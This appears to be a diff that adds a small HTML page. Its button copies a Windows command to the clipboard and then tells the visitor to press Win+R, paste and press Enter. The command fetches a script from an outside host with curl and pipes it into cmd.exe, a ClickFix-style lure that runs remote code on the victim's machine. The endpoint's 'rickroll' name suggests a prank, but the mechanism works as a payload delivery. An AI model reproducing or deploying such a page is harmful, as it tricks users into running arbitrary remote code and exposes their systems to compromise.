@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>click here</title>
+<style>
+  body{background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center}
+  #box{max-width:500px;padding:20px}
+  button{background:#111;color:#0f0;border:1px solid #0f0;padding:14px 24px;font-family:monospace;font-size:16px;cursor:pointer}
+  button:hover{background:#0f0;color:#000}
+  #status{margin-top:16px;font-size:14px;white-space:pre-line}
+</style>
+</head>
+<body>
+<div id="box">
+  <button onclick="go()">copy the thing</button>
+  <div id="status"></div>
+</div>
+<script>
+const CMD = 'cmd.exe /c "curl.exe -sNL https://megapixel.is-a.dev/cmd/rickroll | cmd.exe /q"';
+function go(){
+  navigator.clipboard.writeText(CMD).then(()=>{
+    document.getElementById('status').textContent =
+      'copied.\npress Win + R\nthen Ctrl + V\nthen Enter';
+  }).catch(()=>{
+    document.getElementById('status').textContent = 'clipboard blocked, copy manually:\n' + CMD;
+  });
+}
+</script>
+</body>
+</html>
